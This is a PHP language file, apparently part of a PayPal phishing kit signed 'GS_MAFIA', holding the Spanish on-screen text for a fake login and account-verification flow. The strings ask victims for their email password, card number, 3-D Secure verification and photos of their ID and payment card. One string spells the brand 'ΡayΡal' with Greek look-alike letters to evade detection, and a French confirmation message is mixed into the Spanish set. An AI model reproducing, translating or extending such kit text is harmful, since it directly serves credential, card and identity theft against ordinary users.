<?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
$gs_string1 = "E-mail";
$gs_string2 = "Siguiente";
$gs_string3= "¿Tiene problemas para iniciar sesión?";
$gs_string4 = "o";
$gs_string5 = "Regístrate";
$gs_string6 = "Contáctenos";
$gs_string7 = "Intimidad";
$gs_string8 = "Legal";
$gs_string9 = "En todo el mundo";
$gs_string10 = "Cambio";
$gs_string11 = "Iniciar sesión";
$gs_string12 = "Tu seguridad es nuestra principal prioridad";
$gs_string13 = "Actualiza tu dirección de facturación";
$gs_string14 = "Nombre de pila";
$gs_string15 = "Apellido";
$gs_string16 = "Dirección";
$gs_string17 = "Ciudad";
$gs_string18 = "Código postal";
$gs_string19 = "Continuar";
$gs_string20 = "Realimentación";
$gs_string21 = "Actualizar información de la tarjeta";
$gs_string22 = "Nombre del titular de la tarjeta";
$gs_string23 = "Mes";
$gs_string24 = "Año";
$gs_string25 = "Verificación segura en 3-D";
$gs_string26 = "Actualice su acceso de correo electrónico";
$gs_string27 = "Dirección de correo electrónico";
$gs_string28 = "Contraseña de dirección de correo electrónico";
$gs_string29 = "Adjunte una copia de su documento de identidad";
$gs_string30 = "Adjunte una imagen de su tarjeta (parte posterior / frontal)";
$gs_string31 = "Finalizar";
$gs_string32 = "Contraseña";
$gs_string33 = "Información de la tarjeta";
$gs_string34 = "Número de tarjeta";
$gs_string35 = "País";
$gs_string36 = "Félicitations";
$gs_string37 = "<center> Vos informations de compte soumises sont en cours de révision par notre personnel. <br> <br> En attendant, vous pouvez accéder à votre compte avec une sécurité renforcée. <br> <br> <b> Merci d'avoir choisi ΡayΡal. </ B> <br> <br> <center> <br> <b> Vous allez être redirigé pour vous connecter à votre compte ΡayΡal ... </ b> <br> <br> ";
$gs_string38 = "Verificación de cuenta - Centro de seguridad";
$gs_string39 = "Inicie sesión en su cuenta de PayPal";
$gs_string40 = "Verificación de cuenta - Centro de seguridad";
?>
